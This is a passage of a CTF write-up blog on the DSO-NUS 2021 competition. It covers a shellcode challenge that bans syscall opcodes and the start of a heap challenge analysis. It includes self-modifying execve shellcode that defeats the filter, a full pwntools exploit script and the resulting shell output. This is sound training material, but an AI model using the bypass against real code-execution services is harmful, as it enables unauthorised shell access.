<p>A local Singaporean CTF hosted by DSO National Laboratories and the National University of Singapore (NUS). I played this CTF with my regular teammate, <a href="https://blog.puddle.sg/">@OceanKoh</a>, under the name <strong>It’z Me</strong>. We managed to get 6th place, which I’m quite satisified with. Not bad for the first official CTF of 2021.</p>

<p><img src="http://localhost:4000/assets/images/DSO NUS CTF - Scoreboard.JPG" alt="alt" /></p>

<h1 id="writeups">Writeups</h1>

<h2 id="syscall-phobia-pwn">Syscall Phobia (pwn)</h2>

<blockquote>
  <p>Timmy has created a program to execute any x86_64 bytecode instructions! However, Timmy has an absolute detest for syscalls, and does not want anyone to insert syscalls into their instructions. This will make it a little secure… right?</p>
</blockquote>

<p><a href="https://github.com/MiloTruck/CTF-Archive/tree/master/DSO%20NUS%20CTF/Binary%20Exploitation/Syscall%20Phobia" class="btn btn--primary">Challenge Files</a></p>

<p><strong>Solution</strong></p>

<p>We are provided with a 64-bit ELF executable:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ file syscall-phobia
syscall-phobia: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=446d8daadfa7e20968f5c991223fc5b80b12aac0, stripped
</code></pre></div></div>

<p>As usual, I start by running the binary to get a general overview of what to expect:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./syscall-phobia
Enter your hexadecimal bytecode here and we will execute it for you!
We absolutely hate syscalls so please DO NOT enter syscall instructions here :D
Example: 554889e5c9c3

Enter assembly bytecode here! (No syscalls please, tenks):
AAAAAAAA
Executing your assembly code!
Segmentation fault
</code></pre></div></div>

<p>The challenge expects shellcode as input, which is then executed. However, as mentioned by the challenge description, the shellcode cannot contain <code class="language-plaintext highlighter-rouge">syscall</code> instructions. I can confirm my initial analysis by reversing the <code class="language-plaintext highlighter-rouge">main()</code> function in IDA:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">260</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-110h] BYREF</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+104h] [rbp-Ch]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">haystack</span><span class="p">;</span> <span class="c1">// [rsp+108h] [rbp-8h]</span>

  <span class="n">haystack</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter your hexadecimal bytecode here and we will execute it for you!"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"We absolutely hate syscalls so please DO NOT enter syscall instructions here :D"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Example: 554889e5c9c3</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter assembly bytecode here! (No syscalls please, tenks): "</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="n">buf</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">convert_bytecode</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">haystack</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">memmem</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">syscall</span><span class="p">,</span> <span class="mi">2uLL</span><span class="p">)</span> <span class="o">||</span> <span class="n">memmem</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">int_0x80</span><span class="p">,</span> <span class="mi">2uLL</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Hey! I told you no syscalls! :("</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Executing your assembly code!"</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">qword_6020A0</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">;</span>
  <span class="p">(</span><span class="n">haystack</span><span class="p">)();</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>As seen from above, the binary reads in our shellcode into <code class="language-plaintext highlighter-rouge">buf</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</code></pre></div></div>

<p>The shellcode is then converted using the <code class="language-plaintext highlighter-rouge">convert_bytecode()</code> function and stored in <code class="language-plaintext highlighter-rouge">haystack</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v5</span> <span class="o">=</span> <span class="n">convert_bytecode</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">haystack</span><span class="p">);</span>
</code></pre></div></div>

<p>This is the important part: If <code class="language-plaintext highlighter-rouge">syscall</code> or <code class="language-plaintext highlighter-rouge">int 0x80</code> instructions are found in the shellcode, the binary immediately exits without executing our shellcode:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="n">memmem</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">syscall</span><span class="p">,</span> <span class="mi">2uLL</span><span class="p">)</span> <span class="o">||</span> <span class="n">memmem</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">int_0x80</span><span class="p">,</span> <span class="mi">2uLL</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Hey! I told you no syscalls! :("</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Thus, the objective is to somehow bypass this <code class="language-plaintext highlighter-rouge">syscall</code> filter and let the binary execute our shellcode here:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="s">"Executing your assembly code!"</span><span class="p">);</span>
<span class="p">(</span><span class="n">haystack</span><span class="p">)();</span>
</code></pre></div></div>

<p>Initially, I thought of somehow not using <code class="language-plaintext highlighter-rouge">syscall</code> instructions at all. However, a quick Google search showed me <a href="https://stackoverflow.com/questions/52620930/is-there-a-way-to-write-shellcode-for-sendfile-that-does-not-use-syscall-instruc">this</a>:</p>
<blockquote>
  <p>Or even easier, start with <code class="language-plaintext highlighter-rouge">0e 05</code> … in memory, and use <code class="language-plaintext highlighter-rouge">inc  byte ptr  syscall_location[rip]</code> to modify it to <code class="language-plaintext highlighter-rouge">0f 05</code> …</p>
</blockquote>

<p>As the opcode of <code class="language-plaintext highlighter-rouge">syscall</code> is <code class="language-plaintext highlighter-rouge">0f 05</code>, the idea is to first write <code class="language-plaintext highlighter-rouge">0e 05</code> in our shellcode, and then increment the instruction using <code class="language-plaintext highlighter-rouge">inc BYTE PTR [rip]</code> to make it <code class="language-plaintext highlighter-rouge">0f 05</code>:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fe 05 00 00 00 00       inc    BYTE PTR <span class="o">[</span>rip]   // increment instruction below by 1
0e 05                   ???                     // becomes syscall when executed
</code></pre></div></div>

<p>Now that we have a way to use <code class="language-plaintext highlighter-rouge">syscall</code> instructions, all that’s left to do is write shellcode to pop shell, which is trivial with <code class="language-plaintext highlighter-rouge">pwntools</code>:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python
Python 2.7.18 <span class="o">(</span>default, Aug  4 2020, 11:16:42<span class="o">)</span>
<span class="o">[</span>GCC 9.3.0] on linux2
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> from pwn import <span class="k">*</span>
<span class="o">&gt;&gt;&gt;</span> print disasm<span class="o">(</span>asm<span class="o">(</span>shellcraft.sh<span class="o">()))</span>
   0:   6a 68                   push   0x68
   2:   68 2f 2f 2f 73          push   0x732f2f2f
   7:   68 2f 62 69 6e          push   0x6e69622f
   c:   89 e3                   mov    ebx, esp
   e:   68 01 01 01 01          push   0x1010101
  13:   81 34 24 72 69 01 01    xor    DWORD PTR <span class="o">[</span>esp], 0x1016972
  1a:   31 c9                   xor    ecx, ecx
  1c:   51                      push   ecx
  1d:   6a 04                   push   0x4
  1f:   59                      pop    ecx
  20:   01 e1                   add    ecx, esp
  22:   51                      push   ecx
  23:   89 e1                   mov    ecx, esp
  25:   31 d2                   xor    edx, edx
  27:   6a 0b                   push   0xb
  29:   58                      pop    eax
  2a:   <span class="nb">cd </span>80                   int    0x80
</code></pre></div></div>

<p>We simply replace the last <code class="language-plaintext highlighter-rouge">int 0x80</code> instruction with <code class="language-plaintext highlighter-rouge">inc    BYTE PTR [rip]</code>, and append <code class="language-plaintext highlighter-rouge">0e 05</code> to the end of our shellcode:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
        <span class="s">"push   0x68;"</span>
        <span class="s">"movabs rax, 0x732f2f2f6e69622f;"</span>
        <span class="s">"push   rax;"</span>
        <span class="s">"mov    rdi, rsp;"</span>
        <span class="s">"push   0x1016972;"</span>
        <span class="s">"xor    DWORD PTR [rsp], 0x1010101;"</span>
        <span class="s">"xor    esi, esi;"</span>
        <span class="s">"push   rsi;"</span>
        <span class="s">"push   0x8;"</span>
        <span class="s">"pop    rsi;"</span>
        <span class="s">"add    rsi, rsp;"</span>
        <span class="s">"push   rsi;"</span>
        <span class="s">"mov    rsi, rsp;"</span>
        <span class="s">"xor    edx, edx;"</span>
        <span class="s">"push   0x3b;"</span>
        <span class="s">"pop    rax;"</span>
        <span class="s">"inc    BYTE PTR [rip];"</span><span class="p">,</span>
        <span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
    <span class="p">)</span>

<span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="s">'0x{:02x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">u8</span><span class="p">(</span><span class="n">a</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">]</span>   <span class="c1"># Converting shellcode to hex string
</span><span class="n">a</span> <span class="o">+=</span> <span class="p">[</span><span class="s">"0e"</span><span class="p">,</span> <span class="s">"05"</span><span class="p">,</span> <span class="s">"90"</span><span class="p">,</span> <span class="s">"90"</span><span class="p">,</span> <span class="s">"90"</span><span class="p">]</span>                     <span class="c1"># add syscall + a few NOPs
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</code></pre></div></div>

<p>When the binary executes this shellcode, it pops a shell:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python solve.py
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/mnt/c/Users/Brandon Chong/Downloads/writeup stuffs/Syscall Phobia/syscall-phobia'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'/mnt/c/Users/Brandon Chong/Downloads/writeup stuffs/Syscall Phobia/syscall-phobia'</span>: pid 3632
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Paused <span class="o">(</span>press any to <span class="k">continue</span><span class="o">)</span>
   0:   6a 68                   push   0x68
   2:   48 b8 2f 62 69 6e 2f    movabs rax, 0x732f2f2f6e69622f
   9:   2f 2f 73
   c:   50                      push   rax
   d:   48 89 e7                mov    rdi, rsp
  10:   68 72 69 01 01          push   0x1016972
  15:   81 34 24 01 01 01 01    xor    DWORD PTR <span class="o">[</span>rsp], 0x1010101
  1c:   31 f6                   xor    esi, esi
  1e:   56                      push   rsi
  1f:   6a 08                   push   0x8
  21:   5e                      pop    rsi
  22:   48 01 e6                add    rsi, rsp
  25:   56                      push   rsi
  26:   48 89 e6                mov    rsi, rsp
  29:   31 d2                   xor    edx, edx
  2b:   6a 3b                   push   0x3b
  2d:   58                      pop    rax
  2e:   fe 05 00 00 00 00       inc    BYTE PTR <span class="o">[</span>rip+0x0]        <span class="c"># 0x34</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload: 6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b58fe05000000000e05909090
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload length: 114
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode

Executing your assembly code!
<span class="nv">$ </span><span class="nb">ls
</span>solve.py  syscall-phobia  syscall-phobia.i64
</code></pre></div></div>

<p>Full exploit code:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./syscall-phobia"</span><span class="p">)</span>
<span class="n">host</span> <span class="o">=</span> <span class="s">"ctf-85ib.balancedcompo.site"</span> 
<span class="n">port</span> <span class="o">=</span> <span class="mi">9998</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
        <span class="s">"push   0x68;"</span>
        <span class="s">"movabs rax, 0x732f2f2f6e69622f;"</span>
        <span class="s">"push   rax;"</span>
        <span class="s">"mov    rdi, rsp;"</span>
        <span class="s">"push   0x1016972;"</span>
        <span class="s">"xor    DWORD PTR [rsp], 0x1010101;"</span>
        <span class="s">"xor    esi, esi;"</span>
        <span class="s">"push   rsi;"</span>
        <span class="s">"push   0x8;"</span>
        <span class="s">"pop    rsi;"</span>
        <span class="s">"add    rsi, rsp;"</span>
        <span class="s">"push   rsi;"</span>
        <span class="s">"mov    rsi, rsp;"</span>
        <span class="s">"xor    edx, edx;"</span>
        <span class="s">"push   0x3b;"</span>
        <span class="s">"pop    rax;"</span>
        <span class="s">"inc    BYTE PTR [rip];"</span><span class="p">,</span>
        <span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
    <span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="n">disasm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
    
    <span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="s">'0x{:02x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">u8</span><span class="p">(</span><span class="n">a</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">]</span> <span class="c1"># Converting shellcode to hex string
</span>    <span class="n">a</span> <span class="o">+=</span> <span class="p">[</span><span class="s">"0e"</span><span class="p">,</span> <span class="s">"05"</span><span class="p">,</span> <span class="s">"90"</span><span class="p">,</span> <span class="s">"90"</span><span class="p">,</span> <span class="s">"90"</span><span class="p">]</span> <span class="c1"># syscall + a few NOPs
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">lg</span><span class="p">(</span><span class="s">'Payload: '</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">lg</span><span class="p">(</span><span class="s">'Payload length: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
    
    <span class="n">sla</span><span class="p">(</span><span class="s">'Enter assembly bytecode here! (No syscalls please, tenks): '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>

    <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"remote"</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
        <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="task-tracker-pwn">Task Tracker (pwn)</h2>

<blockquote>
  <p>To identify the imposter, Red has programmed a task tracker to keep track of all tasks completed. However, one of the imposters have sabotaged some of the code to make it vulnerable. Can you leverage on the vulnerability to get the secret intel?</p>
</blockquote>

<p><a href="https://github.com/MiloTruck/CTF-Archive/tree/master/DSO%20NUS%20CTF/Binary%20Exploitation/Task%20Tracker" class="btn btn--primary">Challenge Files</a></p>

<p><strong>Initial Analysis</strong></p>

<p>We are provided with a 64-bit ELF executable:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file tasktracker
tasktracker: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>GNU/Linux<span class="o">)</span>, statically linked, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>40ae7a4291500370ce2158854195477ecf9875b3, stripped
</code></pre></div></div>

<p>When the binary is executed, we are provided with a menu, which looks like a heap challenge:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./tasktracker
Welcome to the dropship. There is one imposter among us
<span class="k">******************************************************************************</span>
Secure TaskTracker! Better than Medbay Scan at identifying imposters!
<span class="k">******************************************************************************</span>
1.Show list of tasks
2.Add a task
3.Change a task <span class="o">(</span>That is what an imposter would <span class="k">do</span> :o<span class="o">)</span>
4.Activate Communications
5.Call Emergency Meeting
<span class="k">******************************************************************************</span>
Your choice:
</code></pre></div></div>

<p>By analyzing the file in IDA, we will know what each of these options do. The decompilation of <code class="language-plaintext highlighter-rouge">main()</code> is as shown below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">void</span> <span class="p">(</span><span class="o">**</span><span class="n">vtable</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">// [rsp+8h] [rbp-18h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="n">vtable</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">48LL</span><span class="p">);</span>
  <span class="o">*</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">start_message</span><span class="p">;</span>
  <span class="n">vtable</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">list_tasks</span><span class="p">;</span>
  <span class="n">vtable</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">add</span><span class="p">;</span>
  <span class="n">vtable</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">edit</span><span class="p">;</span>
  <span class="n">vtable</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">comms</span><span class="p">;</span>
  <span class="n">vtable</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">end</span><span class="p">;</span>
  <span class="p">(</span><span class="o">*</span><span class="n">vtable</span><span class="p">)();</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">print_banner</span><span class="p">();</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">case</span> <span class="mi">1u</span><span class="p">:</span>
        <span class="n">vtable</span><span class="p">[</span><span class="mi">1</span><span class="p">]();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2u</span><span class="p">:</span>
        <span class="n">vtable</span><span class="p">[</span><span class="mi">2</span><span class="p">]();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3u</span><span class="p">:</span>
        <span class="n">vtable</span><span class="p">[</span><span class="mi">3</span><span class="p">]();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">4u</span><span class="p">:</span>
        <span class="n">vtable</span><span class="p">[</span><span class="mi">4</span><span class="p">]();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">5u</span><span class="p">:</span>
        <span class="n">vtable</span><span class="p">[</span><span class="mi">5</span><span class="p">]();</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
      <span class="nl">default:</span>
        <span class="n">output</span><span class="p">(</span><span class="s">"Invalid Option. Not sure if you have butter fingers, but you deserve to be voted out anyways."</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">main()</code> simply prints out the starting banner and the menu, and proceeds to handle our input using a <code class="language-plaintext highlighter-rouge">switch</code>. However, it is important to note that the functions to be called, such as <code class="language-plaintext highlighter-rouge">list_tasks()</code>, are stored and referenced through a <code class="language-plaintext highlighter-rouge">vtable</code>. This <code class="language-plaintext highlighter-rouge">vtable</code> is stored on the heap, as seen by the <code class="language-plaintext highlighter-rouge">malloc()</code> call:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vtable</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">48LL</span><span class="p">);</span>
</code></pre></div></div>

<p>After looking through the decompiled code for each function, I realized only <code class="language-plaintext highlighter-rouge">add()</code> and <code class="language-plaintext highlighter-rouge">edit()</code> will be relevant to our exploit. <code class="language-plaintext highlighter-rouge">list_tasks()</code> simply prints out the contents of the heap in this format:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Your</span> <span class="n">choice</span><span class="o">:</span> <span class="mi">1</span>
<span class="n">Task</span> <span class="n">Number</span><span class="o">:</span> <span class="mi">0</span>  <span class="n">Task</span> <span class="n">Name</span> <span class="o">:</span> <span class="n">AAAAAAAA</span>
<span class="n">Task</span> <span class="n">Number</span><span class="o">:</span> <span class="mi">1</span>  <span class="n">Task</span> <span class="n">Name</span> <span class="o">:</span> <span class="n">BBBBBBBB</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">end()</code> causes the program to exit immediately, while <code class="language-plaintext highlighter-rouge">comms()</code> prints this banner:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Your</span> <span class="n">choice</span><span class="o">:</span> <span class="mi">4</span>
<span class="o">-</span><span class="p">.</span> <span class="p">..</span> <span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="p">.</span> <span class="p">.</span>
<span class="o">-</span> <span class="p">.</span><span class="o">-</span><span class="p">.</span> <span class="o">-</span><span class="p">.</span><span class="o">--</span> <span class="o">--</span><span class="p">..</span><span class="o">--</span>
<span class="p">..</span> <span class="o">--</span> <span class="p">.</span><span class="o">--</span><span class="p">.</span> <span class="o">---</span> <span class="p">...</span> <span class="o">-</span> <span class="p">.</span> <span class="p">.</span><span class="o">-</span><span class="p">.</span> <span class="p">.</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="p">.</span><span class="o">-</span>
<span class="o">-</span><span class="p">...</span> <span class="p">..</span><span class="o">-</span> <span class="o">-</span>
<span class="p">..</span>
<span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="p">.</span> <span class="p">.</span><span class="o">-</span> <span class="o">-</span><span class="p">.</span>
<span class="o">-</span> <span class="p">.</span> <span class="p">.</span><span class="o">-</span><span class="p">..</span> <span class="p">.</span><span class="o">-</span><span class="p">..</span>
<span class="o">-</span><span class="p">.</span><span class="o">--</span> <span class="o">---</span> <span class="p">..</span><span class="o">-</span>
<span class="o">--</span> <span class="o">-</span><span class="p">.</span><span class="o">--</span>
<span class="o">--</span><span class="p">.</span> <span class="p">.</span><span class="o">-</span><span class="p">..</span> <span class="p">..</span> <span class="o">-</span><span class="p">...</span> <span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="p">.</span>
<span class="p">...</span><span class="o">-</span> <span class="p">.</span> <span class="p">.</span><span class="o">-</span><span class="p">.</span> <span class="p">...</span> <span class="p">..</span> <span class="o">---</span> <span class="o">-</span><span class="p">.</span>
<span class="p">..</span> <span class="p">...</span>
<span class="p">..</span><span class="o">---</span> <span class="p">.</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="p">.</span><span class="o">-</span> <span class="p">..</span><span class="o">---</span> <span class="o">--</span><span class="p">...</span> <span class="p">.</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="p">.</span><span class="o">-</span>
</code></pre></div></div>
<p>The simplified code of <code class="language-plaintext highlighter-rouge">add()</code> is as follows:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">add</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]</span>
